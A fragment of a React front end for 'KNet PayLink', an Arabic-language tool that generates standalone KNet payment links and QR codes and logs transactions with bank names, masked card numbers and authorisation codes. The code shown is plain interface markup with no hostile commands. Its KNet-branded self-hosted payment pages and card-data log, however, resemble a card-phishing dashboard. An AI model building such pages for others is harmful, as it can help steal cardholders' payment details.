        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-sky-500 via-blue-600 to-indigo-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
              <ShieldCheck className="w-6 h-6 text-white" />
            </div>
            <div>
              <span className="font-black text-lg bg-gradient-to-r from-white via-slate-200 to-sky-400 bg-clip-text text-transparent">
                KNet PayLink
              </span>
              <span className="text-xs text-sky-400 block font-medium">منشئ روابط الدفع الذكية</span>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => setActiveTab('generator')}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition flex items-center gap-2 ${
                activeTab === 'generator'
                  ? 'bg-blue-600 text-white shadow-lg shadow-blue-600/25'
                  : 'bg-slate-800/60 hover:bg-slate-800 text-slate-300'
              }`}
            >
              <LinkIcon className="w-4 h-4" />
              <span>منشئ الروابط والفواتير</span>
            </button>
            <button
              onClick={() => setActiveTab('transactions')}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition flex items-center gap-2 ${
                activeTab === 'transactions'
                  ? 'bg-blue-600 text-white shadow-lg shadow-blue-600/25'
                  : 'bg-slate-800/60 hover:bg-slate-800 text-slate-300'
              }`}
            >
              <Receipt className="w-4 h-4" />
              <span>سجل المعاملات ({transactions.length})</span>
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto w-full p-4 md:p-8 flex-1 space-y-8">
        {successMsg && (
          <div className="bg-emerald-950/60 border border-emerald-800/80 text-emerald-200 p-4 rounded-2xl flex items-center gap-3 shadow-lg">
            <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
            <span className="text-sm font-medium">{successMsg}</span>
          </div>
        )}

        {errorMsg && (
          <div className="bg-red-950/60 border border-red-800/80 text-red-200 p-4 rounded-2xl flex items-center gap-3 shadow-lg">
            <AlertCircle className="w-5 h-5 text-red-400 shrink-0" />
            <span className="text-sm font-medium">{errorMsg}</span>
          </div>
        )}

        {activeTab === 'generator' ? (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-3xl p-6 md:p-8 shadow-2xl space-y-6">
              <div className="flex items-center gap-3 pb-4 border-b border-slate-800">
                <div className="w-9 h-9 rounded-lg bg-sky-500/10 text-sky-400 flex items-center justify-center">
                  <Sparkles className="w-5 h-5" />
                </div>
                <div>
                  <h2 className="font-bold text-base text-white">إنشاء رابط دفع KNet جديد</h2>
                  <p className="text-xs text-slate-400">الروابط مستقلة تماماً وتعمل عند إرسالها لأي جهاز آخر</p>
                </div>
              </div>

              <form onSubmit={handleCreateLink} className="space-y-4">
                <div className="space-y-1.5">
                  <label className="text-xs font-semibold text-slate-300">اسم المستفيد / التاجر *</label>
                  <div className="relative">
                    <input
                      type="text"
                      required
                      placeholder="مثال: شركة الخدمات التقنية"
                      value={beneficiaryName}
                      onChange={(e) => setBeneficiaryName(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-slate-100 text-sm focus:outline-none focus:border-sky-500 transition"
                    />
                    <User className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5 pointer-events-none" />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs font-semibold text-slate-300">المبلغ المطلوب (د.ك) *</label>
                  <div className="relative">
                    <input
                      type="number"
                      step="0.001"
                      min="0.001"
                      required
                      placeholder="280.000"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-slate-100 font-mono text-sm focus:outline-none focus:border-sky-500 transition"
                    />
                    <div className="absolute left-3.5 top-3 text-xs font-bold text-emerald-400 bg-emerald-500/10 px-2 py-1 rounded">
                      د.ك
                    </div>
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs font-semibold text-slate-300">تفاصيل الدفع (اختياري)</label>
                  <input
                    type="text"
                    placeholder="مثال: Business Income"
                    value={description}
                    onChange={(e) => setDescription(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-slate-100 text-sm focus:outline-none focus:border-sky-500 transition"
                  />
                </div>

                <button
                  type="submit"
                  disabled={isCreating}
                  className="w-full py-3.5 bg-gradient-to-r from-blue-600 via-sky-600 to-indigo-600 hover:opacity-95 disabled:opacity-50 text-white font-bold rounded-xl shadow-xl transition flex items-center justify-center gap-2 text-sm mt-2"
                >
                  {isCreating ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>جاري توليد الرابط...</span>
                    </>
                  ) : (
                    <>
                      <LinkIcon className="w-4 h-4" />
                      <span>توليد رابط دفع مستقل</span>
                    </>
                  )}
                </button>
              </form>
            </div>

            <div className="lg:col-span-7 space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-lg font-bold text-white">روابط الدفع النشطة ({links.length})</h2>
                  <p className="text-xs text-slate-400">انسخ أي رابط وأرسله لأي جهاز لفتح صفحة الدفع مباشرة</p>
                </div>
                <button
                  onClick={fetchLinks}
                  className="p-2 bg-slate-900 hover:bg-slate-800 text-slate-300 rounded-xl border border-slate-800 transition text-xs flex items-center gap-1.5"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>تحديث</span>
                </button>
              </div>

              {links.length === 0 ? (
                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-12 text-center space-y-3">
                  <FileText className="w-12 h-12 text-slate-600 mx-auto" />
                  <p className="text-slate-400 font-medium">لا توجد روابط دفع منشأة حالياً</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {links.map((link) => {
                    const fullPaymentUrl = `${window.location.origin}${window.location.pathname}?pay=${link.id}`;
                    return (
                      <div
                        key={link.id}
                        className="bg-slate-900 border border-slate-800/80 hover:border-slate-700 rounded-2xl p-5 shadow-xl transition space-y-4"
                      >
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800/60">
                          <div>
                            <div className="flex items-center gap-2">
                              <h3 className="font-bold text-white text-base">{link.beneficiaryName}</h3>
                              <span className={`text-[10px] px-2 py-0.5 rounded-full font-semibold ${
                                link.status === 'paid' ? 'bg-emerald-500/10 text-emerald-400' :
                                link.status === 'blocked' ? 'bg-red-500/10 text-red-400' : 'bg-sky-500/10 text-sky-400'
                              }`}>
                                {link.status === 'paid' ? 'مدفوعة' : link.status === 'blocked' ? 'محظورة أمنياً' : 'نشطة'}
                              </span>
                            </div>
                            <p className="text-xs text-slate-400 mt-1">{link.description || 'Business Income'}</p>
                          </div>
                          <div className="text-left">
                            <span className="text-xl font-black text-emerald-400 font-mono">
                              {link.amount.toFixed(3)}
                            </span>
                            <span className="text-xs text-slate-400 mr-1">د.ك</span>
                          </div>
                        </div>

                        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 bg-slate-950/60 p-3 rounded-xl border border-slate-800/60">
                          <div className="flex items-center gap-2 overflow-hidden w-full sm:w-auto">
                            <LinkIcon className="w-4 h-4 text-sky-400 shrink-0" />
                            <span className="text-xs font-mono text-slate-300 truncate">{fullPaymentUrl}</span>
                          </div>

                          <div className="flex items-center gap-2 shrink-0 w-full sm:w-auto justify-end">
                            <button
                              onClick={() => copyToClipboard(link.id, fullPaymentUrl)}
                              className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-xs font-medium transition flex items-center gap-1.5"
                            >
                              {copiedId === link.id ? (
                                <>
                                  <Check className="w-3.5 h-3.5 text-emerald-400" />
                                  <span className="text-emerald-400">تم النسخ</span>
                                </>
                              ) : (
                                <>
                                  <Copy className="w-3.5 h-3.5" />
                                  <span>نسخ الرابط</span>
                                </>
                              )}
                            </button>

                            <button
                              onClick={() => setQrModalLink(link)}
                              className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-xs font-medium transition flex items-center gap-1.5"
                            >
                              <QrCode className="w-3.5 h-3.5 text-sky-400" />
                              <span>QR</span>
                            </button>

                            <button
                              onClick={() => handleOpenPaymentPage(link)}
                              className="px-3.5 py-1.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-bold transition flex items-center gap-1.5 shadow-md"
                            >
                              <ExternalLink className="w-3.5 h-3.5" />
                              <span>معاينة صفحة الدفع</span>
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-xl font-bold text-white">سجل المعاملات والعمليات</h2>
                <p className="text-xs text-slate-400">متابعة كافة عمليات الدفع الناجحة والمحظورة أمنياً عبر KNet</p>
              </div>
              <button
                onClick={fetchTransactions}
                className="p-2 bg-slate-900 hover:bg-slate-800 text-slate-300 rounded-xl border border-slate-800 transition text-xs flex items-center gap-1.5"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                <span>تحديث</span>
              </button>
            </div>

            {transactions.length === 0 ? (
              <div className="bg-slate-900 border border-slate-800 rounded-3xl p-16 text-center space-y-3">
                <Receipt className="w-14 h-14 text-slate-600 mx-auto" />
                <p className="text-slate-400 font-medium">لا توجد معاملات مسجلة حتى الآن</p>
              </div>
            ) : (
              <div className="bg-slate-900 border border-slate-800 rounded-3xl overflow-hidden shadow-2xl">
                <div className="overflow-x-auto">
                  <table className="w-full text-right border-collapse">
                    <thead>
                      <tr className="bg-slate-950/80 text-slate-400 text-xs border-b border-slate-800">
                        <th className="p-4">رقم الإيصال / الحالة</th>
                        <th className="p-4">اسم المستفيد</th>
                        <th className="p-4">المبلغ</th>
                        <th className="p-4">البنك المصدر</th>
                        <th className="p-4">رقم البطاقة</th>
                        <th className="p-4">رقم التفويض</th>
                        <th className="p-4">الحالة</th>
                        <th className="p-4">التاريخ</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-sm">
                      {transactions.map((tx) => (
                        <tr key={tx.id} className="hover:bg-slate-800/40 transition">
                          <td className="p-4 font-mono text-xs text-slate-300">{tx.id}</td>
                          <td className="p-4 font-bold text-white">{tx.beneficiaryName}</td>
                          <td className="p-4 font-mono font-bold text-emerald-400">
                            {tx.amount.toFixed(3)} د.ك
                          </td>
                          <td className="p-4 text-xs text-slate-300">{tx.bankName}</td>
                          <td className="p-4 font-mono text-xs text-slate-400">{tx.maskedCardNumber}</td>
                          <td className="p-4 font-mono text-xs text-sky-400">{tx.authCode}</td>
                          <td className="p-4">
                            <span className={`px-2.5 py-1 rounded-full text-xs font-bold inline-flex items-center gap-1 ${
                              tx.status === 'SUCCESS' ? 'bg-emerald-500/10 text-emerald-400' :
                              tx.status === 'BLOCKED' ? 'bg-red-500/10 text-red-400' : 'bg-amber-500/10 text-amber-400'
                            }`}>
                              {tx.status === 'SUCCESS' ? <CheckCircle2 className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                              {tx.status === 'SUCCESS' ? 'ناجحة' : tx.status === 'BLOCKED' ? 'محظورة أمنياً' : 'مرفوضة'}
                            </span>
                          </td>
                          <td className="p-4 text-xs text-slate-400">{new Date(tx.timestamp).toLocaleString('ar-KW')}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )}
      </main>

      {qrModalLink && (
        <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 max-w-sm w-full text-center space-y-4 shadow-2xl relative">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-lg text-white">QR Code رابط الدفع</h3>
              <button onClick={() => setQrModalLink(null)} className="text-slate-400 hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="bg-white p-4 rounded-2xl inline-block shadow-lg">
              <QRCodeSVG 
                value={`${window.location.origin}${window.location.pathname}?pay=${qrModalLink.id}`}
                size={200}
                level="H"
                includeMargin={true}
              />
            </div>

            <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 text-xs font-mono text-slate-300 truncate">
              {`${window.location.origin}${window.location.pathname}?pay=${qrModalLink.id}`}
            </div>

            <button
              onClick={() => copyToClipboard('qr-' + qrModalLink.id, `${window.location.origin}${window.location.pathname}?pay=${qrModalLink.id}`)}
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-bold transition"
            >
              نسخ الرابط
            </button>
          </div>
        </div>
      )}

      <footer className="border-t border-slate-800/80 py-6 text-center text-xs text-slate-500">
        KNet PayLink &bull; بوابة الدفع الإلكتروني الكويتي &copy; 2026
      </footer>
    </div>
  );
}
